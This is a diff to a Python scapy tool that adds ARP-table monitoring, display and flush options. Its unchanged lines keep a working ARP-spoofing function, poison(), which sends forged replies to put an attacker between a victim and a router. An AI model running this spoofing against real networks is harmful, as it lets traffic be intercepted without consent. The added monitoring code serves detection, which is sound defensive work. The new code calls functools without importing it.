@@ -5,11 +5,12 @@ import sh
 import re
 import argh
 import time
-import utils
 import signal
 import logging
 import itertools
 from scapy.all import *
+
+import utils as util
 
 
 def _arp_registered_MAC(ip, interface=Ether):
@@ -51,7 +52,7 @@ def poison(routerIP, victimIP, attackerIP, interface='eth0'):
         send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC, hwsrc=routerMAC))
         send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC, hwsrc=victimMAC))
 
-    with utils.ip_forwarding():
+    with util.ip_forwarding():
         signal.signal(signal.SIGINT, _signal_handler)
         while True:
             send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=attackerMAC, hwsrc=victimMAC), count=3)
@@ -59,28 +60,58 @@ def poison(routerIP, victimIP, attackerIP, interface='eth0'):
             time.sleep(2)
 
 
-def verify():
-    pass
+def monitor(interface=None):
+    try:
+        table = dict(itertools.chain(*_load_mac_table().values()))
+    except:
+        table = {}
+
+    def fn(packet):
+        if not packet[ARP].op == 2:
+            return
+
+        ip, mac = packet[ARP].psrc, packet[ARP].hwsrc
+        msg = "Response: \t %s \t has address \t %s" % (ip, mac)
+
+        if table.get(ip):
+            if table[ip] != mac:
+                logging.warn('%s \t > Differ from current arp table' % msg)
+                print '%s > %s' % (ip, mac)
+            else:
+                logging.info('%s \t > Already on arp table' % msg)
+        else:
+            logging.info('%s \t > New to arp table' % msg)
+
+        table[ip] = mac
+
+    sniff_fn = sniff if not interface else functools.partial(sniff, iface=interface)
+    sniff_fn(filter='arp', prn=fn, store=0)
 
 
-def monitor():
-    pass
+def display(interface=None):
+    for iface, entries in _load_mac_table().items():
+        if interface and iface != interface:
+            continue
 
-
-def display():
-    for interface, entries in _load_mac_table().items():
-        print 'Interface %s (%i items)' % (interface, len(entries))
+        print 'Interface %s (%i items)' % (iface, len(entries))
         for ip, mac in sorted(entries):
             print '\t %s \t %s' % (ip, mac)
         print
 
 
-def flush(ip=None):
-    entries = [(ip, None)] if ip else itertools.chain(*_load_mac_table().values())
+def flush(ip=None, interface=None):
+    if not ip:
+        table = _load_mac_table()
+        entries = table.get(interface, []) if interface else itertools.chain(*table.values())
+    else:
+        entries = [(ip, None)]
+
     for ip, _ in entries:
         sh.arp('-d', ip)
+        logging.info('Flushed %s' % ip)
 
 
 if __name__ == '__main__':
+    util.assure_root()
     logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-    argh.dispatch_commands([poison, flush, verify, monitor, display])
+    argh.dispatch_commands([poison, flush, monitor, display])
